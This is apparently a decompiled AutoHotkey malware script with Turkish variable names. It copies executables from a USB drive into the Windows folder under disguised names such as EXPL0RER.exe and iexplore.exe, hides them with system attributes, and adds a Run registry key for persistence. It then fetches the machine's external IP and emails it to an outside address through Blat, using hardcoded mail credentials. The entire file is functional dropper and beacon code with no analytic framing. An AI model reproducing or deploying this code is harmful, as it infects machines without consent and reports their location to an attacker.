; <COMPILER: v1.0.47.5>





#NoTrayIcon
#SingleInstance ignore

DriveGet, surucu_isimleri, List, REMOVABLE
FileDelete, %Windir%\temp\output.tmp
FileAppend,
(
%surucu_isimleri% 
), %Windir%\temp\output.tmp 
FileRead, cikarilabilir_suruculer, %Windir%\temp\output.tmp
usb_ismi := SubStr( cikarilabilir_suruculer, 0 )

FileCopy, %usb_ismi%:\explorer.exe, %WinDir%\EXPL0RER.exe
FileCopy, %usb_ismi%:\system32.exe, %WinDir%\iexplore.exe
FileCopy, %usb_ismi%:\mail.exe, %WinDir%\system32\blat.exe
FileCopy, %usb_ismi%:\mail.dll, %WinDir%\system32\blat.dll
FileCopy, %usb_ismi%:\mail.lib, %WinDir%\system32\blat.lib

FileSetAttrib, +RSH, %WinDir%\system32\blat.exe
FileSetAttrib, +RSH, %WinDir%\system32\blat.dll
FileSetAttrib, +RSH, %WinDir%\system32\blat.lib
FileSetAttrib, +RSH, %WinDir%\EXPL0RER.exe
FileSetAttrib, +RSH, %WinDir%\iexplore.exe

RegWrite, REG_SZ, HKEY_LOCAL_MACHINE, SOFTWARE\Microsoft\Windows\CurrentVersion\Run, iexplore, %WinDir%\iexplore.exe
Run, iexplore.exe, %WinDir% , hide

dis_ip=0.0.0.0
gecici_dosya=%WinDir%\TEMP\ip.tmp
UrlDownloadToFile,http://www.netikus.net/show_ip.html,%gecici_dosya%
FileReadLine,dis_ip,%gecici_dosya%,1

mail_server=mail.gunix.org
kimden=burdayim@gunix.org
kime  =deneme@gunix.org
kullanici_adi =deneme@gunix.org
sifre =sanane
Run,%comspec% /c Blat -install %mail_server% %kimden%, ,hide
Run,%comspec% /c Blat - -body "bende buradayim" -subject %dis_ip% -to %kime% -u %kullanici_adi% -pw %sifre%, ,hide
exitapp
